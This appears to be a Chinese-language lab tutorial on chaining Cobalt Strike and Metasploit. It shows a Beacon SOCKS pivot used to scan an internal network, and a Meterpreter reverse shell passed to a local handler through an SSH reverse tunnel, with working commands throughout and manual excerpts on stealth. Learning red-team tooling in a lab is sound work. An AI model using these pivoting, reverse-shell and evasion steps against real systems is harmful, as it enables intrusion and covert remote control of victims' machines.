# 0x01 准备工作

- 受害主机：在关闭 Windows Defender 和其他一切杀软的前提下，在 Win 10 主机下进行的实验。
- MSF：本地 kali
- Cobalt Strike 团队服务器：Ubuntu VPS
- Cobalt Strike：3.14


**团队服务器：**

![title](https://leanote.com/api/file/getImage?fileId=5e17e16bab64415a9700522b)

**客户端：**

![title](https://leanote.com/api/file/getImage?fileId=5e17e684ab64415a97005337)

**上线过程：**

因为我关闭了一切杀软及 Windows Defender，自不必做免杀。

![title](https://leanote.com/api/file/getImage?fileId=5e17e223ab64415a97005244)

![title](https://leanote.com/api/file/getImage?fileId=5e17e264ab64415895005272)

![title](https://leanote.com/api/file/getImage?fileId=5e17e2c6ab64415895005288)

一些朋友搞不清楚 `Windows Executable` 和 `Windows Executable (s)` 的区别。据官方文档说，`Windows Executable` 是生成一个 `stager`，但是 `Windows Executable (s)` 是 stageless 的，相当于直接生成一个 `stage`。这个涉及一个分阶段传送 payload 的概念，不做过多解释。我认为选 `Windows Executable (s)` 比较好，因为 payload stager 因其体积原因，没有一些内建的安全特性。所以能不分阶段就不分阶段。

然后就点击上线。

![title](https://leanote.com/api/file/getImage?fileId=5e17e726ab64415a97005358)

点击上线之后，可以做一些基本的配置。如设置「抖动因子」或者启动「交互式模式」。

这两个概念官方手册有写，以下部分摘自 cs 官方文档，我翻译了一下：

> 请注意，Beacon 是一个异步的 payload。命令不会立即执行。每个命令都会先进入队列。当 Beacon 连接到你的时候。它会下载这些命令并挨个执行它们。此时，Beacon 会将所有的输出报告给你。如果输入有误，使用 `clear` 命令来清理当前 Beacon 的命令队列。<br/>
默认情况下，Beacon 每60秒连接到你一次。你可以使用 Beacon 的 `sleep` 命令修改这个时间设置。使用 `sleep` 接着一个秒数来指定 Beacon 连接到你的频率。你也可以指定第二个参数，这个参数必须是一个0到99之间的数字。这个数字就是抖动因子。Beacon 会根据你指定的抖动因子的百分比随机变化下次连接到你的时间。比如，`sleep 300 20`这条命令，会使得 Beacon 睡眠 300秒，另外有 20% 的抖动因子。这意味着 Beacon 在每次连接到你之后会随机睡眠 240 - 300秒。 <br/>
要使得 Beacon 每秒都多次连接到你，使用 `sleep 0` 命令。这就是「交互式模式」。这种模式下命令会立即执行。在你的隧道流量通过它之前你必须使得你的 Beacon 处于交互模式下。一些 Beacon 命令（如 `browerpivot`、`desktop`等）会自动的使 Beacon 在下次连接到你时处于交互式模式下。

在这里我设置为交互式模式好了：

![title](https://leanote.com/api/file/getImage?fileId=5e17ec79ab64415895005457)

# 0x02 通过 beacon 内置的 socks 功能将本地 Msf 直接代入目标内网进行操作

准备工作说的有点事无巨细，相信这些大家也都会。然后就开始做 CS 和 MSF 的联动。

为什么需要 CS 和 MSF 的联动呢？主要是两个框架的侧重点不一样，尽管我们有了 Beacon，但是我们有时候还需要借助 MSF 的 scanner、exploit 这些功能模块，而 CS 更侧重后渗透、团队合作一些。


MSF 就是本地 Kali 自带的 msf5：

![title](https://leanote.com/api/file/getImage?fileId=5e17edefab644158950054a2)

首先，到已控目标内网机器的 Beacon 下把 socks 起起来：

```
beacon> getuid
beacon> socks 1080
```

![title](https://leanote.com/api/file/getImage?fileId=5e17eed8ab64415a970054cb)

然后，通过 `View` → `Proxy Pivots`，复制生成的 MSF 代理链接。

![title](https://leanote.com/api/file/getImage?fileId=5e17efaeab644158950054f7)


![title](https://leanote.com/api/file/getImage?fileId=5e17f02bab6441589500550d)

本地启动 MSF，挂着上面生成的代理链接，即可直接对目标内网进行各种探测：

```
msf > setg Proxies socks4:1xx.1xx.57.70:1080    意思就是让本地的 msf 走上面 cs 的 socks 代理
msf > setg ReverseAllowProxy true               建双向通道
msf > use auxiliary/scanner/smb/smb_version     拿着 msf 中的各类探测模块对目标内网进行正常探测即可,比如,识别目标内网所有 Windows 机器的详细系统版本,机器名和所在域
msf > set rhosts 192.168.56.0/24                指定 CIDR 格式的目标内网段，掩码可根据实际情况给的大一点,比如,0/20,0/16...
msf > set threads 1                             线程不宜给的太大，可根据目标实际情况,控制在10以内
msf > run
```

![title](https://leanote.com/api/file/getImage?fileId=5e17fe0cab644158950057c1)

根据实际情况增强或削弱掩码，从缩小或扩大扫描的子网范围。

总之，这种方法是你先有一个 CS Beacon shell，然后通过 socks 代理，把受害主机的流量代理到本地的 msf，然后本地 msf 就可以进行一些内网探测或漏洞利用。

# 0x03 尝试借助 CS 的外部 tcp 监听器通过 ssh 隧道直接派生一个 meterpreter 的 shell 到本地


**铺垫知识：**

铺垫知识很长，但只有先了解铺垫知识，后面的操作才会更好理解。

1、 CS Foreign Listener
在这里要借助 CS 的 Foreign 监听器。如图是 CS 3.14 的监听器截图（CS 4.0的监听器类别有了较大改变）：

![title](https://leanote.com/api/file/getImage?fileId=5e180660ab64415a97005979)



以下内容引自 cs 官方文档，我做了一下翻译：
> 其中，Foreign 监听器支持与其他软件的监听器进行派生（spawn），如 msf 的 `multi/handler`。<br/>
将监听器设置为 foreign 并指定主机和端口后可以将 Cobalt Strike 的 payload 生成的会话转移到 msf 中。

2、 CS 通讯模型

首先要明确的一点是，所谓 CS+MSF 的联动，用大白话来说就是流量转发。

流量转发是 CS 与 MSF 之间的事情，与受害主机的 Beacon 无关。完全是 CS 服务器与 MSF 服务器这二者之间的流量转发。

因为 CS 是 C/S 架构的，那么就牵扯出一个问题：CS 转发流量到 MSF（或相反的方向），流量是 MSF 和 CS 客户端直连呢？还是走的 CS 的团队服务器进行转发呢？

这个就会涉及到 CS 的通讯模型：

![title](https://leanote.com/api/file/getImage?fileId=5e181a1eab64415895005ce7)

上图来自 Klion 的文章，是我们的客户端与团队服务器的通讯模型。


以下内容来自 cs 官方手册，本人做了微小的翻译工作：

> Cobalt Strike 采取措施保护 Beacon 的通信，确保 Beacon 只能接收来自其团队服务器的任务并且只能将结果发送至其团队服务器。<br/>
首次设置 Beacon payload 时，Cobalt Strike 会生成一个团队服务器专有的公钥/私钥对。团队服务器的公钥会嵌入 Beacon 的 payload stage。Beacon 使用团队服务器的公钥来加密发送到团队服务器的会话元数据。 <br/>
Beacon 必须在团队服务器可以发出和接收来自 Beacon 会话的输出之前持续发送会话元数据。此元数据包含一个由 Beacon 生成的随机会话秘钥。团队服务器使用每个 Beacon 的会话秘钥来加密任务并解密输出。<br/>
每个 Beacon 都使用此相同的方案来实现数据通道。<u>当在混合 HTTP 和 DNS Beacon 中使用记录数据通道时，有和使用 HTTPS Beacon 同样的安全保护。</u><br/>
请注意，当 Beacon 分阶段时， payload stager 因为其体积原因，没有这些内建的安全特性。

<br/>



> 监听器是 Cobalt Strike 与 bot 之间进行通讯的核心模块。同时是 payload 的配置信息以及告诉 Cobalt Strike 服务器以从 payload 收连接指令。其实是位于 payload 配置上一层的抽象概念。<br/>
监听器由用户定义的名称、payload 类型、主机、端口及其他信息组成，用于定义 payload 的存放位置。

虽然这些话说的很抽象，但是总之概括其意思，就是说：

**CS 的通讯模型中，客户端不会直接与 payload 进行连接，都是必须经过团队服务器的。以团队服务器为中介，这是 CS 设计的一种的安全机制。**

所以对于此问题：

CS 转发流量到 MSF（或相反的方向），流量是 MSF 和 CS 客户端直连呢？还是走的 CS 的团队服务器进行转发呢？

答案应该是：CS 与 MSF 之间的流量转发，其实是 CS 团队服务器与 MSF 之间的流量转发。客户端作为第三方只是与 CS 团队服务器进行交互。

这样就清楚多了，确定了流量转发的双方对象为：

- CS 团队服务器（后文简称 TS）
- MSF 服务器

那么根据实际情况的网络环境就会有如下这些可能的场景（CS团队服务器一般不会开在本地）：

1. `CS TS` 在公网、`MSF` 在本地
2. `CS TS` 在公网、`MSF` 在公网

`MSF` 在公网的情况比 `MSF` 在本地的情况相对更好转发一些。因为如果 `MSF` 在本地，没有公网 IP 地址，要想把 `CS TS` 的流量发到 `MSF`，就需要额外的处理。

3、 Spawn



下面是 cs 官方手册中关于 `spawn` 的介绍，我同样做了一点微小的翻译工作：

> Cobalt Strike 的 Beacon 最初是一个稳定的生命线，让你可以保持对受害主机的访问权限。从一开始，Beacon 的主要目的就是向其他的 Cobalt Strike 监听器传递权限。<br/>
使用 `spawn` 命令来为一个监听器派生一个会话。此 `spawn` 命令接受一个结构（如：x86，x64）和一个监听器作为其参数。<br/>
默认情况下，`spawn` 命令会在 rundll32.exe 中派生一个会话。管理员通过查看告警可能会发现 rundll32.exe 定期与 Internet 建立连接这种异常现象。为了更好的隐蔽性，你可以找到更合适的程序（如 Internet Explorer） 并使用 `spawnto` 命令来说明在派生新会话时候会使用 Beacon 中的哪个程序。

注：拓展阅读——[DllMain与rundll32详解](https://payloads.online/archivers/2019-10-02/1)，倾旋的博客，倾旋，2019年10月2日

个人理解，实际上就是这种过程：


![title](https://leanote.com/api/file/getImage?fileId=5e19568bab64411e2c001afe)

当你对某个 Beacon 选择了 `spawn`，就是派生，之后会让你选择一个 `Listener`：

![title](https://leanote.com/api/file/getImage?fileId=5e1821a3ab64415895005e70)

`Listener` 就是位于 payload 配置上一层的抽象概念，也就是告诉 CS 团队服务器从 payload 收连接指令的地方，定义了 payload 的存放位置。


**通过对某个 Beacon 指定 Listener 进行派生，我们生成了新的会话。这个意思就是让受害主机的 `rundll32.exe` 这个程序定期与我们指定在这个 Listener 中的地址、端口进行连接，进行指令的收发。**

顺便多说一句，在 CS 中，将 payload 注入到内存中的命令除了 `spawn`，还有 `inject`。



**具体操作：**

理解了前面的铺垫知识，下面的操作就很好理解了。




*第一步： 在本地 MSF上创建监听器*

到本地机器把 msf 起起来,并创建如下监听器：
```
msf > use exploit/multi/handler 
msf > set payload windows/meterpreter/reverse_tcp 注: 此处的协议格式务必要和上面 cs 外部监听器的协议对应,不然 meter 是无法正常回连的 
msf > set lhost 192.168.113.131                   注：这里填本地 MSF 服务器的 IP 地址
msf > set lport 8080 
msf > exploit 
``` 
 

![title](https://leanote.com/api/file/getImage?fileId=5e182f3fab64415a97006135)
 
![title](https://leanote.com/api/file/getImage?fileId=5e18302eab64415a97006158)
 
 
这样就在本地 MSF 上创建了一个监听器。

*第二步：给本地 MSF 一个公网地址*

这里通过 SSH 隧道转发：

在一台公网 VPS 上编辑 sshd 配置，开启 ssh 转发功能,重启 ssh 服务，这是所有使用 ssh 隧道转发前的必备操作：
```
# vi /etc/ssh/sshd_config 
AllowTcpForwarding yes 
GatewayPorts yes 
TCPKeepAlive yes 
PasswordAuthentication yes 
 
# systemctl restart sshd.service 
``` 

再次回到自己本地的 Kali 中并通过 ssh 隧道做好如下转发： 
```
# ssh -C -f -N -g -R 0.0.0.0:8080:192.168.113.131:8080 root@x.x.57.70 -p 27035 
``` 

![title](https://leanote.com/api/file/getImage?fileId=5e1833f5ab644158950061c8)
 
上面命令的意思就：
1. 通过 x.x.57.70 这台机器把来自外部的 8080 端口流量全部转到我本地 192.168.113.131 的 8080 端口上；
2. 而本地 192.168.113.131 的 8080 端口上跑的又正好是 meterpreter 的监听器；
3. 所以，最终才会造成 meterpreter 本地上线的效果。
 
 
隧道建立之后，习惯性的到 vps 上去看一眼，刚才通过隧道监听的 8080 端口到底有没有起来，确实起起来了才说明隧道才是通的。另外，监听的端口不能和 vps 机器上的现有端口冲突，否则隧道是建不成功的。 
```
# netstat -tulnp | grep '8080' 
``` 

![title](https://leanote.com/api/file/getImage?fileId=5e183532ab64415a97006263)

如图就是建立成功了。

*第三步： 在 CS 上创建外部监听器*


在 cs 上创建一个 tcp 的 foreign listener，回连端口设为 8080：



TCP 就可以，如果是 `HTTP` 或 `HTTPS`，最好用域名而不是 IP。


![title](https://leanote.com/api/file/getImage?fileId=5e1837b4ab64415895006281)


这里的 MSF 的公网地址，就是第二步中通过 SSH 隧道转发到的 VPS 的公网地址。

之所以要生成这个外部监听器，是因为后面我们要使用 `spawn` 命令，把会话转移到 MSF 的服务器上。listener 是 `spawn` 命令的参数。

如果我们的 MSF 是跑在公网服务器上的话，就可以省去第二步中 SSH 隧道从公网 VPS 转发流量到本地的那步操作。

注：我看到在一些文章中，还会加一个监听器，用于监听团队服务器。可能是因为以为只能有一个会话，但是经本人测试，会话 spawn 到 msf 上之后，本地 CS 客户端依然可以操作。所以就不必多开一个对 CS TS 的监听器了。

*第四步：spawn*

派生会话的操作很简单：

对 Beacon 选择 `spawn` 选项（或在 Beacon shell 命令行里面输入 `spawn`）：
![title](https://leanote.com/api/file/getImage?fileId=5e18395dab644158950062e7)

为其选择 MSF 的 listener 作为参数：

![title](https://leanote.com/api/file/getImage?fileId=5e1839abab64415a97006339)

回到本地 MSF，就会发现相应目标机器的 meterpreter 已经被直接弹回到了本地：


![title](https://leanote.com/api/file/getImage?fileId=5e1836f4ab64415895006255)

总之，我们完成了这样一个操作，从而实现了从 CS Beacon 到本地 MSF meterpreter 的派生：


![title](https://leanote.com/api/file/getImage?fileId=5e183c0bab6441589500635c)

最后，To be honest，这个问题我也遇到了：

![title](https://leanote.com/api/file/getImage?fileId=5e1844d2ab64415895006521)

如何去解决这个问题，是否 MSF 开在公网就能改善此情况，我还没有试过。在未来的日子里，我会努力探索出更稳定的解决方案。

![title](https://leanote.com/api/file/getImage?fileId=5e19591eab64411c2d001b71)

---------------

**拓展阅读：**

[1] [DllMain与rundll32详解](https://payloads.online/archivers/2019-10-02/1)，倾旋的博客，倾旋，2019年10月2日

----------------
**参考文档：**

[1] CobaltStrike + Metasploit 实战联动利用 [ 一 ] ，Klion，2019年6月
[2] csmannual 4.0，https://www.cobaltstrike.com/downloads/csmanual40.pdf
[3] 感谢 UD94、because we can 等朋友的帮助

